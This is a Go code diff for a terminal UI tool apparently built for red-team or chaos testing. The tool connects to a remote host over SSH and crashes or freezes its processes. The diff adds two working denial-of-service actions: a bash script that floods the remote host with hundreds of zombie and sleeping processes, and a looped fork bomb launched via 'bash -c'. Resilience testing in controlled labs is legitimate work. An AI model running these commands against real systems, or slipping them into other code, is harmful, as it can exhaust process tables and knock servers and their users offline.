@@ -34,7 +34,7 @@ type RedTeamModel struct {
 	filtering   bool
 	loading     bool
 	err         error
-	
+	statusMsg   string
 	selectedPID string 
 }
 
@@ -66,10 +66,11 @@ func NewRedTeamModel() *RedTeamModel {
 	ti.CharLimit = 20
 	ti.Width = 30
 
-	return &RedTeamModel{
-		table:       t,
-		filterInput: ti,
-	}
+    return &RedTeamModel{
+        table:       t,
+        filterInput: ti,
+        statusMsg:   "Ready",  
+    }
 }
 
 func (m *RedTeamModel) SetConnection(cfg *SSHConfig) {
@@ -149,6 +150,7 @@ func (m *RedTeamModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 	case string:
 		if msg == "refresh" || msg == "signal_sent" {
+			m.statusMsg = "Ready"
 			return m, fetchRemoteProcesses(m.sshCfg)
 		}
 
@@ -183,6 +185,13 @@ func (m *RedTeamModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			if pid := m.getSelectedPID(); pid != "" {
 				return m, sendRemoteSignal(m.sshCfg, pid, "CONT")
 			}
+		case "z": // ZOMBIE
+        	m.statusMsg = "Spawning zombie processes..."
+        		return m, spawnZombie(m.sshCfg)
+    	case "b": // BOMB
+        	m.statusMsg = "Launching fork bomb (use with caution)..."
+        		return m, forkBomb(m.sshCfg)
+
 		case "up", "down":
 			m.table, cmd = m.table.Update(msg)
 			m.selectedPID = m.getSelectedPID()
@@ -237,12 +246,66 @@ func sendSignal(pid int, sig syscall.Signal) {
 }
 
 func (m *RedTeamModel) View() string {
-	if m.err != nil { return fmt.Sprintf("Remote Error: %v", m.err) }
-	if m.sshCfg == nil { return "Please connect via 'Connect' tab first." }
-	
-	header := ""
-	if m.filtering { header = fmt.Sprintf("Filter: %s", m.filterInput.View()) }
-	
-	help := "\n [k] Crash (SEGV) | [f] Freeze | [r] Resume | [/] Filter | [esc] Back"
-	return header + baseStyle.Render(m.table.View()) + lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render(help)
+    if m.err != nil { return fmt.Sprintf("Remote Error: %v", m.err) }
+    if m.sshCfg == nil { return "Please connect via 'Connect' tab first." }
+    
+    header := ""
+    if m.filtering { 
+        header = fmt.Sprintf("Filter: %s", m.filterInput.View()) 
+    }
+    
+    help := "\n [k] Crash (SEGV) | [f] Freeze | [r] Resume | [z] Zombie | [b] Bomb | [/] Filter | [esc] Back"
+    
+    // ДОБАВЛЕНО ОТОБРАЖЕНИЕ СТАТУСА
+    status := lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render(fmt.Sprintf(" %s ", m.statusMsg))
+    
+    return header + 
+           baseStyle.Render(m.table.View()) + 
+           lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render(help) +
+           "\n" + status
+}
+
+
+func spawnZombie(cfg *SSHConfig) tea.Cmd {
+    return func() tea.Msg {
+        if cfg == nil { return nil }
+        
+        zombieScript := `
+        (
+            for i in {1..500}; do
+                (
+                    (exit 0) &
+                    CHILD_PID=$!
+                    
+                    sleep 0.1
+                    
+                    sleep 300 &
+                ) &
+            done
+            
+            sleep 5
+            
+            echo "Created 500 zombie processes (check with 'ps aux | grep Z')"
+        ) &
+        `
+        
+        sshArgs := []string{"-S", cfg.SocketPath, fmt.Sprintf("%s@%s", cfg.User, cfg.Host), "bash", "-c", zombieScript}
+        
+        exec.Command("ssh", sshArgs...).Start()
+        return "signal_sent"
+    }
+}
+
+
+func forkBomb(cfg *SSHConfig) tea.Cmd {
+    return func() tea.Msg {
+        if cfg == nil { return nil }
+        
+        bomb := `ulimit -u 10000; for i in {1..10}; do :(){ :|:& };: & done; echo "Fork bomb launched!"; sleep 1; echo "Processes: $(ps -e | wc -l)"`
+
+        sshArgs := []string{"-S", cfg.SocketPath, fmt.Sprintf("%s@%s", cfg.User, cfg.Host), "bash", "-c", bomb, "&"}
+        
+        exec.Command("ssh", sshArgs...).Start()
+        return "signal_sent"
+    }
 }
